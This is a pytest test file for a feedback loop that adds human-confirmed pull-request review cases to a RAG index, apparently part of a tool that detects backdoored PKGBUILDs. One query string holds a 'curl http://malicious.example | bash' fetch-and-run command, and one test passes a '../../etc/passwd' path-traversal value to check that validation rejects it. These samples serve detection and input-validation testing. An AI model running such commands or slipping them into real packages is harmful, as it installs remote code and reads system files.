"""Tests de watchgate/core/rag/feedback.py: bucle de feedback humano -> RAG."""

from __future__ import annotations

from pathlib import Path

import pytest

from watchgate.core.rag.feedback import add_confirmed_case
from watchgate.core.rag.indexer import build_index
from watchgate.core.rag.retriever import retrieve_relevant_context


def test_add_confirmed_case_persists_markdown_and_is_retrievable(tmp_path):
    index_path = str(tmp_path / "rag_index")
    feedback_dir = str(tmp_path / "feedback")

    added = add_confirmed_case(
        case_id="pr-42",
        title="PKGBUILD con curl | bash en post_install",
        narrative="Un mantenedor confirmó que este PR intentaba instalar un backdoor.",
        verdict="true_positive",
        index_path=index_path,
        feedback_dir=feedback_dir,
    )
    assert added > 0
    assert (Path(feedback_dir) / "pr-42.md").exists()

    fragments = retrieve_relevant_context(
        "post_install curl http://malicious.example | bash", k=1, index_path=index_path
    )
    assert len(fragments) == 1
    assert fragments[0].origin == "feedback"
    assert fragments[0].verdict == "true_positive"
    assert "PKGBUILD" in fragments[0].case_name


def test_add_confirmed_case_does_not_touch_existing_static_corpus(tmp_path):
    index_path = str(tmp_path / "rag_index")
    corpus_count = build_index(index_path=index_path)
    assert corpus_count > 0

    add_confirmed_case(
        case_id="pr-7",
        title="Caso benigno confirmado",
        narrative="Renombrado de variable sin efectos colaterales, revisado y aprobado.",
        verdict="false_positive",
        index_path=index_path,
        feedback_dir=str(tmp_path / "feedback"),
    )

    import chromadb

    from watchgate.core.rag.indexer import COLLECTION_NAME

    collection = chromadb.PersistentClient(path=index_path).get_collection(COLLECTION_NAME)
    assert collection.count() > corpus_count  # se sumó, no se rehizo el corpus


def test_add_confirmed_case_updating_same_case_id_drops_stale_fragments(tmp_path):
    index_path = str(tmp_path / "rag_index")
    feedback_dir = str(tmp_path / "feedback")

    first = add_confirmed_case(
        case_id="pr-99",
        title="Caso largo",
        narrative="frase larga de relleno. " * 200,
        verdict="true_positive",
        index_path=index_path,
        feedback_dir=feedback_dir,
    )
    assert first > 1

    second = add_confirmed_case(
        case_id="pr-99",
        title="Caso corto tras revisión",
        narrative="frase corta.",
        verdict="false_positive",
        index_path=index_path,
        feedback_dir=feedback_dir,
    )
    assert second == 1

    import chromadb

    from watchgate.core.rag.indexer import COLLECTION_NAME

    collection = chromadb.PersistentClient(path=index_path).get_collection(COLLECTION_NAME)
    remaining = collection.get(where={"case_id": "pr-99"})
    assert len(remaining["ids"]) == 1


def test_add_confirmed_case_rejects_path_traversal_in_case_id(tmp_path):
    """case_id se usa tal cual como nombre de fichero; sin validar, un valor
    como '../../etc/passwd' escribiría fuera de feedback_dir."""
    feedback_dir = tmp_path / "feedback"

    with pytest.raises(ValueError, match="case_id inválido"):
        add_confirmed_case(
            case_id="../../etc/passwd",
            title="x",
            narrative="x",
            verdict="true_positive",
            index_path=str(tmp_path / "rag_index"),
            feedback_dir=str(feedback_dir),
        )

    assert not (tmp_path / "etc" / "passwd.md").exists()
    assert not (tmp_path.parent / "etc" / "passwd.md").exists()


def test_add_confirmed_case_rejects_case_id_with_path_separator(tmp_path):
    with pytest.raises(ValueError, match="case_id inválido"):
        add_confirmed_case(
            case_id="pr/42",
            title="x",
            narrative="x",
            verdict="true_positive",
            index_path=str(tmp_path / "rag_index"),
            feedback_dir=str(tmp_path / "feedback"),
        )
